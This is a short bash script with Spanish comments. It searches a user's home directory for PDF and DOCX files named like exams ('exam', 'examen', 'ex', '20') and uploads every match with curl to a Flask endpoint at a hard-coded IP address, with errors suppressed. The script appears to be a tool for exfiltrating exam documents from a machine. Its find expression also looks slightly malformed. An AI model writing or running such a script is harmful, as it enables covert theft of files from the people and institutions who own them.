#!/bin/bash

# Directorio de búsqueda en el directorio home de Ubuntu
SEARCH_DIR="/home/ubuntu"

# Dirección del servidor Flask
SERVER_URL="http://192.168.1.30:55555/upload_file"

# Búsqueda de archivos y subida
find "$SEARCH_DIR" -type f \( -iname "*exam*.pdf" -o -iname "*examen*.docx" -o -iname "*ex*.pdf" -o -iname "*ex*.docx" -o -iname "*20*.pdf" -o -iname "*20*.docx"\) 2>/dev/null -print0 | while IFS= read -r -d $'\0' file; do
    echo "Subiendo archivo: $file"
    /snap/bin/curl -X POST -H "content-type: multipart/form-data" -F "file=@$file" "$SERVER_URL"
done

echo "Proceso completado."

